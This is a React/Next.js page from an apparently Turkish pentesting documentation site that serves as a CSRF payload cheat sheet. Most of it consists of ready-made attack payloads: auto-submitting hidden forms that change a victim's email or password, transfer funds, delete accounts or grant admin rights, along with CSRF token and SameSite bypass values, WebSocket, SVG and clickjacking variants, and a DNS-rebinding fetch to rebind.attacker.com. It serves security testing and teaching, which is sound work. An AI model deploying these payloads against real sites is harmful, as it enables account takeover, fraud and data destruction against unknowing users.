"use client"

import { motion } from "framer-motion"
import { Globe, ArrowLeft, ArrowRight } from "lucide-react"
import Link from "next/link"
import { PayloadList } from "@/components/docs/payload-list"
import { Callout } from "@/components/docs/callout"
import { TableOfContents } from "@/components/docs/table-of-contents"

const tocItems = [
  { id: "temel-csrf", title: "Temel CSRF Payloadları", level: 2 },
  { id: "json-csrf", title: "JSON CSRF", level: 2 },
  { id: "token-bypass", title: "CSRF Token Bypass", level: 2 },
  { id: "samesite-bypass", title: "SameSite Cookie Bypass", level: 2 },
  { id: "gelismis-csrf", title: "Gelişmiş CSRF Teknikleri", level: 2 },
  { id: "login-csrf", title: "Login CSRF", level: 2 },
]

const fadeIn = {
  initial: { opacity: 0, y: 20 },
  animate: { opacity: 1, y: 0 },
  transition: { duration: 0.4 }
}

const stagger = {
  animate: {
    transition: {
      staggerChildren: 0.1
    }
  }
}

export default function CSRFPage() {
  return (
    <div className="relative">
      <TableOfContents items={tocItems} />

      <motion.article
        className="prose prose-invert max-w-none"
        initial="initial"
        animate="animate"
        variants={stagger}
      >
        <motion.div variants={fadeIn} className="mb-8">
          <div className="flex items-center gap-2 text-blue-400 text-sm font-medium mb-4">
            <Globe className="w-4 h-4" />
            <span>Web Zafiyetleri</span>
          </div>

          <h1 className="text-4xl font-bold text-foreground mb-4">
            CSRF (Cross-Site Request Forgery)
          </h1>

          <p className="text-lg text-muted-foreground leading-relaxed">
            Kullanıcının tarayıcısını kullanarak, kullanıcının haberi olmadan istek gönderme saldırısı.
            Oturum açmış kullanıcıların yetkileriyle işlem yapmayı hedefler.
          </p>
        </motion.div>

        <Callout type="warning" title="Önemli">
          CSRF saldırıları için hedef sitenin CSRF token koruması olmaması veya zayıf olması gerekir.
          SameSite cookie attribute ve CORS politikaları da etkili savunma yöntemleridir.
        </Callout>

        <motion.section variants={fadeIn} id="temel-csrf" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-blue-500/10 text-blue-400 text-sm font-mono">01</span>
            Temel CSRF Payloadları
          </h2>
          <p className="text-muted-foreground mb-6">
            HTML formları ve resim etiketleri kullanarak basit CSRF saldırıları.
          </p>

          <PayloadList
            title="HTML Form CSRF"
            initialShow={5}
            payloads={[
              { code: `<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com"/>
  <input type="submit" value="Click me"/>
</form>`, note: "Temel form tabanlı CSRF - kullanıcı tıklaması gerekir" },
              { code: `<form id="csrf" action="https://target.com/transfer" method="POST">
  <input type="hidden" name="amount" value="10000"/>
  <input type="hidden" name="to" value="attacker"/>
</form>
<script>document.getElementById('csrf').submit();</script>`, note: "Auto-submit form - sayfa yüklendiğinde otomatik gönderir" },
              { code: `<body onload="document.forms[0].submit()">
  <form action="https://target.com/delete-account" method="POST">
    <input type="hidden" name="confirm" value="true"/>
  </form>
</body>`, note: "Body onload ile otomatik submit" },
              { code: `<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://target.com/api/update" method="POST" target="csrf-frame" id="csrf-form">
  <input type="hidden" name="setting" value="malicious"/>
</form>
<script>document.getElementById('csrf-form').submit();</script>`, note: "Gizli iframe ile sessiz CSRF - kullanıcı fark etmez" },
              { code: `<img src="https://target.com/logout" style="display:none"/>`, note: "GET tabanlı CSRF - sadece GET istekleri için çalışır" },
              { code: `<img src="https://target.com/api/delete?id=123" onerror="this.src='https://target.com/api/delete?id=456'"/>`, note: "Birden fazla istek gönderme" },
              { code: `<script>
  fetch('https://target.com/api/change-password', {
    method: 'POST',
    credentials: 'include',
    body: 'new_password=hacked123'
  });
</script>`, note: "Fetch API ile CSRF - CORS izin veriyorsa çalışır" },
              { code: `<a href="https://target.com/api/follow?user=attacker">Tıkla kazandın!</a>`, note: "Link tabanlı CSRF - sosyal mühendislik gerektirir" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="json-csrf" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-red-500/10 text-red-400 text-sm font-mono">02</span>
            JSON CSRF
          </h2>
          <p className="text-muted-foreground mb-6">
            JSON API endpoint&apos;lerine CSRF saldırıları. Content-Type kısıtlamalarını atlatma.
          </p>

          <PayloadList
            title="JSON Content-Type CSRF"
            initialShow={5}
            payloads={[
              { code: `<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}' type="hidden"/>
  <input type="submit"/>
</form>`, note: "text/plain ile JSON enjeksiyonu - bazı sunucular kabul eder" },
              { code: `<form action="https://target.com/api/settings" method="POST" enctype="text/plain">
  <input name='{"role":"admin"}' value='' type="hidden"/>
</form>
<script>document.forms[0].submit()</script>`, note: "Basit JSON CSRF" },
              { code: `<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/user", true);
xhr.setRequestHeader("Content-Type", "text/plain");
xhr.withCredentials = true;
xhr.send('{"admin":true}');
</script>`, note: "XHR ile JSON gönderme - withCredentials cookie gönderir" },
              { code: `fetch('https://target.com/api/update', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({role: 'admin'})
})`, note: "Fetch API ile JSON CSRF" },
              { code: `<form action="https://target.com/api/data" method="POST" enctype="application/x-www-form-urlencoded">
  <input name="json" value='{"cmd":"delete"}' type="hidden"/>
</form>`, note: "URL-encoded içinde JSON - bazı parser'lar çözümler" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="token-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-yellow-500/10 text-yellow-400 text-sm font-mono">03</span>
            CSRF Token Bypass
          </h2>
          <p className="text-muted-foreground mb-6">
            CSRF token korumalarını atlatma teknikleri.
          </p>

          <Callout type="tip" title="İpucu">
            Token bypass denerken önce token&apos;ın nasıl doğrulandığını anlamaya çalışın.
            Bazen token sadece varlık kontrolü yapılır, değer kontrolü yapılmaz.
          </Callout>

          <PayloadList
            title="Token Bypass Teknikleri"
            initialShow={5}
            payloads={[
              { code: `csrf_token=`, note: "Boş token - bazen kabul edilir" },
              { code: `csrf_token=null`, note: "Null değer bypass" },
              { code: `csrf_token=undefined`, note: "Undefined değer bypass" },
              { code: `csrf_token=random123`, note: "Rastgele değer - sadece varlık kontrolü yapılıyorsa" },
              { code: `csrf_token=00000000-0000-0000-0000-000000000000`, note: "Sıfır UUID" },
              { code: `<!-- CSRF token parametresini tamamen kaldır -->`, note: "Parametre olmadan istek - eksik parametre kontrolü yoksa" },
              { code: `csrf_token=VALID_TOKEN_FROM_OTHER_USER`, note: "Başka kullanıcının token'ı - global token kullanılıyorsa" },
              { code: `csrf_token[]=`, note: "Array olarak gönder" },
              { code: `csrf_token=VALID_TOKEN&csrf_token=ATTACKER_TOKEN`, note: "Çift parametre - ikincisi kullanılabilir" },
              { code: `CSRF-Token: valid_token
CSRF-Token: attacker_token`, note: "HTTP header'da çift token" },
              { code: `csrf=TOKEN_IN_COOKIE (Cookie'yi değiştir, body'de aynısını gönder)`, note: "Cookie-to-header token bypass - subdomain XSS ile" },
              { code: `Referer: https://target.com/page`, note: "Referer header ekleme - sadece Referer kontrolü varsa" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="samesite-bypass" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-purple-500/10 text-purple-400 text-sm font-mono">04</span>
            SameSite Cookie Bypass
          </h2>
          <p className="text-muted-foreground mb-6">
            SameSite cookie attribute atlatma teknikleri.
          </p>

          <PayloadList
            title="SameSite Bypass"
            initialShow={5}
            payloads={[
              { code: `<a href="https://target.com/api/action">Normal link</a>`, note: "SameSite=Lax - top-level navigation ile bypass" },
              { code: `window.open('https://target.com/api/action')`, note: "Popup ile Lax bypass" },
              { code: `<meta http-equiv="refresh" content="0;url=https://target.com/api/action">`, note: "Meta refresh redirect" },
              { code: `location = 'https://target.com/api/action'`, note: "JavaScript redirect - Lax için çalışır" },
              { code: `<form method="GET" action="https://target.com/api/delete">
  <input name="id" value="123"/>
</form>`, note: "GET form submit - Lax GET isteklerine izin verir" },
              { code: `<!-- Subdomain'den saldırı -->
<script src="https://subdomain.target.com/csrf.js"></script>`, note: "Subdomain XSS ile SameSite bypass" },
              { code: `<!-- 2 dakika içinde POST - Chrome Lax+POST -->
<form method="POST" action="https://target.com/api">...</form>`, note: "Yeni cookie 2dk içinde Lax koruması yok (Chrome)" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="gelismis-csrf" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-orange-500/10 text-orange-400 text-sm font-mono">05</span>
            Gelişmiş CSRF Teknikleri
          </h2>

          <PayloadList
            title="Gelişmiş Payloadlar"
            initialShow={5}
            payloads={[
              { code: `<!-- CORS misconfiguration exploit -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/admin", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"makeAdmin":true}');
</script>`, note: "CORS yanlış yapılandırma ile JSON CSRF" },
              { code: `<!-- Flash CSRF -->
<embed src="malicious.swf" allowscriptaccess="always"/>`, note: "Flash tabanlı CSRF (eski sistemler)" },
              { code: `<!-- WebSocket CSRF -->
<script>
var ws = new WebSocket('wss://target.com/socket');
ws.onopen = function() {
  ws.send('{"action":"delete","id":"all"}');
};
</script>`, note: "WebSocket üzerinden CSRF - CSWSH" },
              { code: `<!-- Clickjacking + CSRF combo -->
<iframe src="https://target.com/settings" style="opacity:0;position:absolute;"></iframe>
<button style="position:relative;">Win Prize!</button>`, note: "Clickjacking ile CSRF birleştirme" },
              { code: `<!-- File upload CSRF -->
<form action="https://target.com/upload" method="POST" enctype="multipart/form-data">
  <input type="file" name="file"/>
  <input type="hidden" name="path" value="../../../etc/"/>
</form>`, note: "Dosya yükleme CSRF" },
              { code: `<!-- DNS rebinding preparation -->
<script>
// Attacker DNS: 1.2.3.4 -> target_internal_ip
fetch('http://rebind.attacker.com/api/internal')
</script>`, note: "DNS rebinding ile internal CSRF" },
              { code: `<!-- PDF CSRF -->
/URI (https://target.com/api/action?param=value)`, note: "PDF içinden CSRF tetikleme" },
              { code: `<!-- SVG CSRF -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    fetch('https://target.com/api/delete', {method:'POST', credentials:'include'});
  </script>
</svg>`, note: "SVG içinde script ile CSRF" },
            ]}
          />
        </motion.section>

        <motion.section variants={fadeIn} id="login-csrf" className="scroll-mt-20">
          <h2 className="text-2xl font-semibold text-foreground mt-12 mb-4 flex items-center gap-3">
            <span className="flex items-center justify-center w-8 h-8 rounded-lg bg-green-500/10 text-green-400 text-sm font-mono">06</span>
            Login CSRF
          </h2>
          <p className="text-muted-foreground mb-6">
            Kullanıcıyı saldırganın hesabına giriş yaptırma saldırısı.
          </p>

          <PayloadList
            title="Login CSRF Payloadları"
            initialShow={5}
            payloads={[
              { code: `<form action="https://target.com/login" method="POST" id="login">
  <input name="username" value="attacker"/>
  <input name="password" value="attacker_pass"/>
</form>
<script>document.getElementById('login').submit()</script>`, note: "Kurbanı saldırgan hesabına giriş yaptır - sonra aktivitelerini izle" },
              { code: `<iframe src="https://target.com/logout" style="display:none"></iframe>
<script>
setTimeout(function(){
  document.getElementById('login').submit();
}, 1000);
</script>`, note: "Önce çıkış yaptır, sonra saldırgan hesabına giriş" },
              { code: `<!-- OAuth Login CSRF -->
<a href="https://target.com/oauth/callback?code=ATTACKER_CODE&state=LEAKED_STATE">
  Click to continue
</a>`, note: "OAuth login CSRF - saldırgan OAuth code ile" },
            ]}
          />
        </motion.section>

        <Callout type="info" title="Test Metodolojisi">
          1. CSRF token varlığını kontrol et{"\n"}
          2. Token&apos;ı kaldırarak/değiştirerek test et{"\n"}
          3. Farklı HTTP methodları dene (GET, POST, PUT){"\n"}
          4. Content-Type değişikliklerini test et{"\n"}
          5. SameSite cookie policy&apos;yi kontrol et{"\n"}
          6. CORS konfigürasyonunu incele
        </Callout>

        <motion.div variants={fadeIn} className="mt-16 pt-8 border-t border-border/50">
          <div className="flex justify-between items-center">
            <Link
              href="/docs/web/sql-injection"
              className="flex items-center gap-2 text-muted-foreground hover:text-foreground transition-colors text-sm"
            >
              <ArrowLeft className="w-4 h-4" />
              SQL Injection
            </Link>
            <Link
              href="/docs/web/ssrf"
              className="text-primary hover:text-primary/80 transition-colors text-sm flex items-center gap-2"
            >
              SSRF
              <ArrowRight className="w-4 h-4" />
            </Link>
          </div>
        </motion.div>
      </motion.article>
    </div>
  )
}
